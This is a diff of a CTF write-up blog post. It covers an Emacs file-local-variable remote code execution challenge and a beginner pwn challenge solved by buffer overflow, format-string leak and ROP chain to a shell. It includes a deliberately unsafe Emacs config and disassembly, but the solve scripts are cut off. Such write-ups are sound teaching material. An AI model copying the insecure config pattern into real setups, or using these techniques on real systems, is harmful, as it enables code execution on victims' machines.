@@ -6,10 +6,10 @@ categories: ctf rev pwn c emacs
 ---
 
 # Intro
-Potluck CTF was a very exciting new ctf made by ZetaTwo so we decided to participate. In short, a new idea it brought to the table is that to join the CTF every team must create a challenge for it. I decided to donate one of my challenges I made for our CTF that will happen in the future TM (or at least that's the plan). We didn't solved much and participated more casually but since I made a chall there I decided to make a write-up for it and with it some of the other challenges I solved.
+Potluck CTF was a very exciting new CTF event made by ZetaTwo, and we were eager to participate. In essence, a new idea it brought to the table was that to join the competition each participating team had to create a challenge for it. I decided to donate one of my challenges I made for our CTF that will happen in the future TM (or at least that's the plan). We didn't solved much and participated in a more casual way but since I made a chall there I decided to make a write-up for it and with it for some of the other challenges I solved.
 
 # Emacro-wave Cooking
-First is the challenge made by me. It only had 6 solves with a lot of top teams participating but I wouldn't call it hard, it's more of a difficulty by obscurity rather than by complexity. We're given a `chall.py` and some other files but they exist only to simulate a victim opening a file we send them in Emacs with the following config:
+First we will look at the challenge made by me. It only had 6 solves with a lot of top teams participating but I wouldn't call it hard, it's more of a difficulty by obscurity rather than by complexity. If I had to guess the Emacs community is slowly dying out, plus it's not a popular choice in the infosec community compared for example to the more scientific/academic communities. We're given a `chall.py` and some other files but they exist only to simulate a victim opening a file we send them in Emacs with the following config:
 ```elisp
 (defvar cooking-motivation-generator
   '(let* ((random-number (random 3))
@@ -22,8 +22,7 @@ First is the challenge made by me. It only had 6 solves with a lot of top teams 
 (put 'cooking-motivation-generator 'safe-local-variable (lambda (_) t))
 (run-with-timer 2 2 (lambda () (eval cooking-motivation-generator)))
 ```
-The idea is to that Emacs will look at commented lines at the beginning and end of a file. Those comments can overwrite variables inside of Emacs. This can lead to a more customized user experience but can also lead to a potential security risk. I think you can see where this is going to? Luckily we can mark variables as unsafe or safe. For unsafe variables we are first asked if we want to execute them, safe variables are executed automatically. In the config file we are creating a variable, marking it as safe with `(put 'cooking-motivation-generator 'safe-local-variable (lambda (_) t))` and then it's `eval`ed. Therefore the solution is to achieve RCE and read the flag. You can read more about local variables in files and it's safety there: https://www.gnu.org/software/emacs/manual/html_node/emacs/File-Variables.html .
-This is my solve.py that will send the flag to a requestcatcher:
+The idea is that Emacs will look at commented lines at the beginning and end of a file. Those comments can overwrite variables inside of Emacs. This can lead to a more customized user experience but can also lead to a potential security risk. I think you can see where this is going to? Luckily we can mark variables as unsafe or safe. For unsafe variables we are first asked if we want to execute them, safe variables are executed automatically. In the config file we are creating a variable, marking it as safe with `(put 'cooking-motivation-generator 'safe-local-variable (lambda (_) t))` and then it's `eval`ed. Therefore the solution is to achieve RCE and read the flag. You can read more about local variables in files and [it's safety there](https://www.gnu.org/software/emacs/manual/html_node/emacs/File-Variables.html). This is my solve.py that will send the flag to a requestcatcher link:
 ```python
 import base64
 from pwn import *
@@ -63,14 +62,13 @@ This is a beginner pwn chall with a small 'twist' if you even can call it that. 
    0x000000000040120d <+50>:	leave
    0x000000000040120e <+51>:	ret
 ```
-We call printf with a hardcoded string and then we call gets. The binary doesn't have ALSR turned on and we have an obvious buffer overflow so we can return back to the binary. The question is where do we turn to? There are no `pop rdi` gadgets inside of the binary so this is not an option. Turns out that while returning from this function the string we wrote to in `gets` is inside of rax so we can return back to before the printf is called to achieve a string format vulnerability.
+We call printf with a hardcoded string and then we call gets. The binary doesn't have ALSR turned on and we have an obvious buffer overflow so we can return back to the binary. The question is where do we return to? There are no `pop rdi` gadgets inside of the binary so this is not an option. Turns out that while returning from this function the string we wrote to in `gets` is inside of the rax register so we can return back to before the printf is called to achieve a string format vulnerability.
 ```asm
    0x00000000004011ee <+19>:	mov    rdi,rax
    0x00000000004011f1 <+22>:	mov    eax,0x0
    0x00000000004011f6 <+27>:	call   0x401060 <printf@plt>
 ```
-It's dictated by the ABI that rdi is the first argument of any function, so we move our string to rdi and then we call `printf` with it.
-We use the string format vuln to achieve a libc leak and then we write a trivial rop chain. One thing to watch out is that we also overwrite the rbp while overflowing so it needs to be set to a writeable memory segment. I set it to `0x404a00`. If we use an address "too close to the boarder from the left" the stack will overflow below 0x404000 and we will segfault, so you need to watch out for that. This is my whole solution:
+It's dictated by the Linux ABI that rdi is the first argument of any function, so we move our string to rdi and then we call `printf` with it. We use the string format vuln to achieve a libc leak and then we write a trivial rop chain giving us a shell. One thing to watch out is that we also overwrite the rbp while overflowing so it needs to be set to a writeable memory segment. I set it to `0x404a00`. If we use an address "too close to the border from the left" the stack will overflow below 0x404000 and we will segfault because this memory is not writeable, so you need to watch out for that. This is my whole solution:
 ```python
 #!/usr/bin/env python3
 
